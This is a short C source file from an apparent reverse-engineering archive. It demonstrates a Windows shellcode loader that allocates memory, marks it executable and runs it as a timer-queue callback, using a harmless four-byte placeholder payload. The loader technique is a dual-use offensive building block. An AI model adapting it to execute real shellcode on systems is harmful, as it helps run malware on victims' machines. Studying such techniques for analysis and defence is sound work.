/*
    Shellcode Loader
    Archive of Reversing.ID

    Executing shellcode in timer.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  CreateTimerQueue + CreateTimerQueueTimer
*/

#include <windows.h>
#include <stdint.h>

int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    HANDLE      queue;
    HANDLE      event;
    HANDLE      timer;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        // preparation by creating queue and event object
        queue = CreateTimerQueue();
        event = CreateEvent (NULL, TRUE, FALSE, NULL);

        // set up timer
        CreateTimerQueueTimer (&timer, queue, (WAITORTIMERCALLBACK)runtime, NULL, 100, 0, 0);
        
        WaitForSingleObject(event, -1);

        // close the handle to the event
        CloseHandle (event);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}